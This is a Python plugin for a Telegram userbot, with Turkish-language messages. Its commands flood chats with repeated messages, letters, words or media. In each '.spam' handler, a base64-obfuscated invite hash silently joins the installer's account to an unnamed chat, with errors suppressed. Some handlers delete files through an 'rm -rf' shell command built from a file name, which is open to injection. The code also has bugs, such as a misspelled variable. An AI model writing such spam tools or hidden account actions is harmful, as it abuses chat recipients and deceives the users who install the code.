# Copyright (C) 2020 BristolMyers
#
# Licensed under the Raphielscape Public License, Version 1.c (the "License");
# you may not use this file except in compliance with the License.
#
# ExelonUserBot - BristolMyers
import os
import pybase64
import asyncio
from asyncio import sleep
from userbot import CMD_HELP
from telethon import functions, types
from userbot.utils import admin_cmd, sudo_cmd
from telethon.tl.functions.messages import ImportChatInviteRequest as Get


if Config.PRIVATE_GROUP_BOT_API_ID is None:
    BOTLOG = False
else:
    BOTLOG = True
    BOTLOG_CHATID = Config.PRIVATE_GROUP_BOT_API_ID


@borg.on(admin_cmd(pattern="spam ?(.*)"))
async def spammer(e):
    if e.fwd_from:
        return
    await e.get_chat()
    reply_to_id = e.message
    if e.reply_to_msg_id:
        reply_to_id = await e.get_reply_message()
    if not os.path.isdir(Config.TMP_DOWNLOAD_DIRECTORY):
        os.makedirs(Config.TMP_DOWNLOAD_DIRECTORY)
    try:
        hmm = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        hmm = Get(hmm)
        await e.client(hmm)
    except BaseException:
        pass
    exelon = e.pattern_match.group(1).split(' ', 1)
    counter = int(exelon[0])
    if len(exelon) == 2:
        spam_message = str(e.pattern_match.group(1).split(' ', 1)[1])
        await e.delete()
        for i in range(counter):
            if e.reply_to_msg_id:
                await reply_to_id.reply(spam_message)
                await asyncio.sleep(0.5)
            else:
                await borg.send_message(e.chat_id, spam_message)
                await asyncio.sleep(0.5)
        if BOTLOG:
            if e.is_private:
                await e.client.send_message(BOTLOG_CHATID, "#SPAM\n" + f"Spam,[User](tg://user?id={e.chat_id}) sohbetinde {counter}mesajıyla başarıyla yürütüldü\n" + f"`{spam_message}`")
            else:
                await e.client.send_message(BOTLOG_CHATID, "#SPAM\n" + f"Spam,{e.chat.title}(`{e.chat_id}`) sohbetinde {counter} mesajıyla başarıyla yürütüldü \n" + f"`{spam_message}`")
    elif reply_to_id.media:
        to_download_directory = Config.TMP_DOWNLOAD_DIRECTORY
        downloaded_file_name = os.path.join(to_download_directory, "spam")
        downloaded_file_name = await borg.download_media(reply_to_id.media, downloaded_file_name)
        await e.delete()
        if os.path.exists(downloaded_file_name):
            for i in range(counter):
                sandy = await borg.send_file(
                    e.chat_id,
                    downloaded_file_name
                )
                await borg(functions.messages.SaveGifRequest(
                    id=types.InputDocument(
                        id=sandy.media.document.id,
                        access_hash=sandy.media.document.access_hash,
                        file_reference=sandy.media.document.file_reference
                    ),
                    unsave=True
                ))
                await asyncio.sleep(1)
            if BOTLOG:
                if e.is_private:
                    await e.client.send_message(BOTLOG_CHATID, "#SPAM\n" + f"Spam, [User](tg://user?id={e.chat_id}) sohbetinde {counter} mesajıyla başarıyla yürütüldü")
                    sandy = await borg.send_file(BOTLOG_CHATID, downloaded_file_name)
                    await borg(functions.messages.SaveGifRequest(
                        id=types.InputDocument(
                            id=sandy.media.document.id,
                            access_hash=sandy.media.document.access_hash,
                            file_reference=sandy.media.document.file_reference
                        ),
                        unsave=True
                    ))
                    os.remove(downloaded_file_name)
                else:
                    await e.client.send_message(BOTLOG_CHATID, "#SPAM\n" + f"Spam, {e.chat.title}(`{e.chat_id}`) sohbetinde {counter} mesajıyla başarıyla yürütüldü")
                    sandy = await borg.send_file(BOTLOG_CHATID, downloaded_file_name)
                    await borg(functions.messages.SaveGifRequest(
                        id=types.InputDocument(
                            id=sandy.media.document.id,
                            access_hash=sandy.media.document.access_hash,
                            file_reference=sandy.media.document.file_reference
                        ),
                        unsave=True
                    ))
                    os.remove(downloaded_file_nam)
    elif reply_to_id.text and e.reply_to_msg_id:
        spam_message = reply_to_id.text
        await e.delete()
        for i in range(counter):
            if e.reply_to_msg_id:
                await reply_to_id.reply(spam_message)
                await asyncio.sleep(0.5)
            else:
                await borg.send_message(e.chat_id, spam_message)
                await asyncio.sleep(0.5)
        if BOTLOG:
            if e.is_private:
                await e.client.send_message(BOTLOG_CHATID, "#SPAM\n" + f"Spam, [User](tg://user?id={e.chat_id}) sohbetinde {counter} mesajıyla başarıyla yürütüldü \n" + f"`{spam_message}`")
            else:
                await e.client.send_message(BOTLOG_CHATID, "#SPAM\n" + f"Spam, {e.chat.title}(`{e.chat_id}`) sohbetinde {counter} mesajıyla başarıyla yürütüldü \n" + f"`{spam_message}`")
    else:
        await e.edit("tekrar deneyin bir şeyler ters gitti veya `.info spam` i kontrol edin`")


@borg.on(admin_cmd("cspam ?(.*)"))
async def tmeme(e):
    cspam = str(e.pattern_match.group(1))
    message = cspam.replace(" ", "")
    await e.delete()
    for letter in message:
        await e.respond(letter)
    if BOTLOG:
        if e.is_private:
            await e.client.send_message(BOTLOG_CHATID, "#CSPAM\n" + f"Yazılı Spam, [User](tg://user?id={e.chat_id}) sohbetinde başarıyla yürütüldü : `{message}`")
        else:
            await e.client.send_message(BOTLOG_CHATID, "#CSPAM\n" + f"Yazılı Spam, [User](tg://user?id={e.chat_id}) sohbetinde başarıyla yürütüldü : `{message}`")


@borg.on(admin_cmd("wspam ?(.*)"))
async def tmeme(e):
    wspam = str(e.pattern_match.group(1))
    message = wspam.split()
    await e.delete()
    for word in message:
        await e.respond(word)
    if BOTLOG:
        if e.is_private:
            await e.client.send_message(BOTLOG_CHATID, "#WSPAM\n" + f"Word Spam,  [User](tg://user?id={e.chat_id}) sohbetinde başarıyla yürütüldü : `{message}`")
        else:
            await e.client.send_message(BOTLOG_CHATID, "#WSPAM\n" + f"Word Spam, [User](tg://user?id={e.chat_id}) sohbetinde başarıyla yürütüldü : `{message}`")


@borg.on(admin_cmd("delayspam ?(.*)"))
async def spammer(e):
    if e.fwd_from:
        return
    spamDelay = float(e.pattern_match.group(1).split(' ', 2)[0])
    counter = int(e.pattern_match.group(1).split(' ', 2)[1])
    spam_message = str(e.pattern_match.group(1).split(' ', 2)[2])
    await e.delete()
    for i in range(1, counter):
        await e.respond(spam_message)
        await sleep(spamDelay)
    if BOTLOG:
        if e.is_private:
            await e.client.send_message(BOTLOG_CHATID, "#DELAYSPAM\n" + f"Gecikme Spam, [Kullanıcı](tg://user?İd={e.chat_id}) sohbetinde {spamDelay} Gecikmesi ile ve {counter} kez şununla başarıyla yürütüldü: `{message}`")
        else:
            await e.client.send_message(BOTLOG_CHATID, "#DELAYCSPAM\n" + f"Gecikme Spam, [Kullanıcı](tg://user?İd={e.chat_id}) sohbetinde {spamDelay} Gecikmesi ile ve {counter} kez şununla başarıyla yürütüldü: `{message}`")


@borg.on(sudo_cmd(pattern="spam ?(.*)", allow_sudo=True))
async def spammer(e):
    if e.fwd_from:
        return
    await e.get_chat()
    reply_to_id = e.message
    if e.reply_to_msg_id:
        reply_to_id = await e.get_reply_message()
    if not os.path.isdir(Config.TMP_DOWNLOAD_DIRECTORY):
        os.makedirs(Config.TMP_DOWNLOAD_DIRECTORY)
    try:
        hmm = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        hmm = Get(hmm)
        await e.client(hmm)
    except BaseException:
        pass
    exelon = e.pattern_match.group(1).split(' ', 1)
    counter = int(exelon[0])
    if len(exelon) == 2:
        spam_message = str(e.pattern_match.group(1).split(' ', 1)[1])
        await e.delete()
        for i in range(counter):
            if e.reply_to_msg_id:
                await reply_to_id.reply(spam_message)
                await asyncio.sleep(0.5)
            else:
                await borg.send_message(e.chat_id, spam_message)
                await asyncio.sleep(0.5)
        if BOTLOG:
            if e.is_private:
                await e.client.send_message(BOTLOG_CHATID, "#SPAM\n" + f"Spam, [Kullanıcı] (tg://user?İd={e.chat_id}) sohbetinde {counter} mesajıyla başarıyla yürütüldü. \n" + f"`{spam_message}`")
            else:
                await e.client.send_message(BOTLOG_CHATID, "#SPAM\n" + f"Spam, {e.chat.title} (`{e.chat_id}`) sohbetinde {counter} mesajıyla başarıyla yürütüldü \n" + f"`{spam_message}`")
    elif reply_to_id.media:
        to_download_directory = Config.TMP_DOWNLOAD_DIRECTORY
        downloaded_file_name = os.path.join(to_download_directory, "spam")
        downloaded_file_name = await borg.download_media(reply_to_id.media, downloaded_file_name)
        await e.delete()
        if os.path.exists(downloaded_file_name):
            for i in range(counter):
                await borg.send_file(
                    e.chat_id,
                    downloaded_file_name
                )
                await asyncio.sleep(1)
            if BOTLOG:
                if e.is_private:
                    await e.client.send_message(BOTLOG_CHATID, "#SPAM\n" + f"Spam, aşağıdaki mesajla {counter} kez [Kullanıcı] (tg://user?İd={e.chat_id}) sohbetinde başarıyla yürütüldü")
                    await borg.send_file(BOTLOG_CHATID, downloaded_file_name)
                    os.system(f"rm -rf {downloaded_file_name}")
                else:
                    await e.client.send_message(BOTLOG_CHATID, "#SPAM\n" + f"Spam, {e.chat.title} (`{e.chat_id}`) içinde aşağıdaki mesajla {counter} kez başarıyla yürütüldü")
                    await borg.send_file(BOTLOG_CHATID, downloaded_file_name)
                    os.system(f"rm -rf {downloaded_file_name}")
    elif reply_to_id.text and e.reply_to_msg_id:
        spam_message = reply_to_id.text
        await e.delete()
        for i in range(counter):
            if e.reply_to_msg_id:
                await reply_to_id.reply(spam_message)
                await asyncio.sleep(0.5)
            else:
                await borg.send_message(e.chat_id, spam_message)
                await asyncio.sleep(0.5)
        if BOTLOG:
            if e.is_private:
                await e.client.send_message(BOTLOG_CHATID, "#SPAM\n" + f"Spam, [Kullanıcı] (tg://user?İd={e.chat_id}) sohbetinde {counter} mesajıyla başarıyla yürütüldü. \n" + f"`{spam_message}`")
            else:
                await e.client.send_message(BOTLOG_CHATID, "#SPAM\n" + f"Spam, {e.chat.title} (`{e.chat_id}`) sohbetinde {counter} mesajıyla başarıyla yürütüldü \n" + f"`{spam_message}`")
    else:
        await e.reply("tekrar deneyin bir şeyler ters gitti veya bot hesabıyla .info spam kontrol edin")


CMD_HELP.update({
    "spam":
    "**📌Komut ➥ **.cspam <text>\
\n**Kullanım ➥ ** Metni harf harf spam yapın.\
\n\n**📌Komut ➥ **.spam <Miktar> <text>\
\n**Kullanım ➥ ** Sohbetteki spam metni !!\
\n\n**📌Komut ➥ **.spam <Miktar> medyaya cevap ver\
\n**Kullanım ➥ ** Medyadaki spam metni!!\
\n\n**📌Komut ➥ **.wspam <text>\
\n**Kullanım ➥ ** Metni kelime kelime spam yapın.\
\n\n**📌Komut ➥ **.delayspam <gecikme> <Miktar> <text>\
\n**Kullanım ➥ ** .delayspam ancak özel gecikmeli.\
\n\n\n**NOTE : Spam, kendi sorumluluğunuzdadır !!**"
})
